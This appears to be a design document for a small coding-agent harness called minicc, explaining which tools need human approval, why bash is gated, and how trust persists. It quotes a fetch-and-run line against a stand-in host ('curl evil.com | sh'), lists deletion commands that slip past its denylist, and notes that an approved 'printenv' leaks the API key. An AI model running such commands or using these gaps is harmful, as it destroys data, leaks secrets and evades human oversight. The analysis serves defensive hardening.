# PERMISSIONS.md — the trust model, and why bash is the hard case

minicc gates three tools before the model may run them. Reads (`read_file`,
`glob`, `grep`) are never gated — they can't mutate. `write_file`/`edit_file` are
gated but *bounded*: the prompt previews the exact path + diff, and the effect is
in-tree and reversible. **bash is the hard case** — most of this doc is about it;
the last section covers how granted trust persists. Code:
[`permissions.py`](minicc/permissions.py), [`tools/bash.py`](minicc/tools/bash.py).

## Why bash is gated

The line between gated and not is **predictability**. For `write_file`, minicc
knows it's writing file X with content Y and can show you. For `bash` it knows
nothing: `subprocess.run(command, shell=True)` on an arbitrary string that could
be `ls` or `curl evil.com | sh`. No automated check can bound a shell command's
effect, so gating substitutes **a human looking at each command** for the
bounding that code can't provide. bash is the one tool whose blast radius is
unbounded *and* opaque.

## What layer is bash's scope at?

A permission decision and what the tool can actually *do* are different layers —
and bash has a boundary at only one of them.

**Permission layer** — where trust is decided (`confirm()`):

```
not gated?     → allow (reads never prompt)
in _ALLOWED?   → allow (trusted this session)
else           → prompt [yes / no / all]
```

This is the *only* boundary that constrains bash.

**Execution layer** — what bash reaches once approved (`bash.py`): **nothing
confines it.** `subprocess.run(command, shell=True)` with no `cwd=` jail (cwd only
sets the starting pwd; `cd`, absolute paths, `~` all escape — *"scope escapes
outside cwd are NOT detected"*), no `env=` restriction (it inherits the whole
environment, **including `ANTHROPIC_API_KEY`**), no sandbox. Privileges = your
user, over the **whole machine**: filesystem, network, processes. The only
technical guards — a substring denylist (`rm -rf /`, `sudo`…), a 120s timeout, an
output cap — are speed bumps, not boundaries (the denylist misses `rm -rf ~`,
`rm -fr /`).

> **So bash's scope is the whole machine at your privilege, and the permission
> gate is its *sole* boundary.** There is no second technical fence. (Contrast
> Claude Code's fine-grained rules — `Bash(git diff:*)` vs `Bash(rm:*)`, path
> patterns; minicc's grants are coarse / whole-tool, so *which scope* you trust
> bash in is the only lever you have.)

## Persisting trust — the allowlist, and why it's load-only

`_ALLOWED` is filled from two sources with deliberately different lifetimes:

- **`'all'` at a prompt** — typed in the moment, lives for the session only
  (in-memory; gone on restart / `/clear`).
- **`allowed_tools` in `settings.json`** — hand-edited, loaded at startup,
  persistent.

The principle that keeps them apart:

> A mistake's cost = its permanence × its silence.

So a hasty `'all'` (the reflex under approval fatigue) must **never auto-persist**
to settings — otherwise the prompt meant to protect you trains you to disable it
forever. `permissions.py` can't even write settings (it doesn't import `config`);
the only path to permanence is editing the file, and that friction *is* the
safety. Startup prints what settings pre-approved, so persistent trust stays
visible. (The one tool never eligible for persistence is **bash** — see above:
the gate is its only boundary.)

## Debt surfaced by this analysis

- bash denylist is trivially bypassable — decorative, not a boundary.
- bash inherits the full env incl `ANTHROPIC_API_KEY` — an approved `printenv`
  leaks it; consider scrubbing secrets from the subprocess env.
- no path confinement / sandbox; coarse (whole-tool) grants.
